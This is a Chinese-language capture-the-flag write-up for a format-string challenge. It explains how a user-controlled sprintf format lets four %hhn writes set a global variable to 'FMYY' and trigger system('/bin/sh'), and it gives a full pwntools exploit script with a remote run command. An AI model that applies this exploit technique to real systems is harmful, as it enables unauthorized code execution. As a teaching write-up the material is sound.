# week30xPwn3_fmt

## 题目简述

程序读取最多 `0x60` 字节到局部数组，然后执行：

```c
sprintf(ar, buf, buf);
```

第二个参数本应是固定格式字符串，却完全由用户控制，因而产生格式化字符串任意写。目标是把 `.bss` 上四字节全局变量 `buf` 改成 `FMYY`；比较成功后，程序会执行 `system("/bin/sh")`。

## 解题过程

`sprintf` 把格式化结果写入全局数组 `ar`，所以攻击阶段不一定能直接看到输出，但“已输出字符数”仍会正常累计。`%hhn` 会把累计值的低 8 位写入参数所指地址，适合逐字节写入四个相邻目标。

实际二进制未开启 PIE，全局 `buf` 位于 `0x404060`。通过格式串偏移测试可知，将四个地址放在输入偏移 `0x30` 之后时，它们分别对应第 11～14 个格式化参数。`0x30` 处先放 `\x00` 结束格式串；后面的地址不会被当成格式字符，却仍保留在栈上供位置参数读取。

目标字节依次是：

```text
F = 0x46 = 70
M = 0x4d = 77
Y = 0x59 = 89
Y = 0x59 = 89
```

字符计数是累积的，因此依次增加 `70`、`7`、`12`；最后一个字节无需继续打印，直接再次执行 `%hhn` 即可写入同样的 `0x59`。

```python
from pwn import ELF, args, context, flat, process, remote

context.binary = elf = ELF("./main", checksec=False)

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process(elf.path)

target = 0x404060

fmt = b"%70c%11$hhn"
fmt += b"%7c%12$hhn"
fmt += b"%12c%13$hhn"
fmt += b"%14$hhn"

payload = fmt.ljust(0x30, b"\x00")
payload += flat(target, target + 1, target + 2, target + 3)

assert len(payload) <= 0x60
io.sendafter(b"Leave Some Message to me", payload)
io.interactive()
```

远程地址通过命令行传入，例如：

```text
python exp.py REMOTE HOST=example.com PORT=10011
```

## 方法总结

利用点是可控 `sprintf` 格式串，而非 `ar` 是否回显。先通过实际二进制确定参数偏移，再把目标地址放在格式串终止符之后，使用四次 `%hhn` 按累计打印量写出 `FMYY`。这种利用依赖固定地址和实测参数位置，不能只根据源码猜偏移。
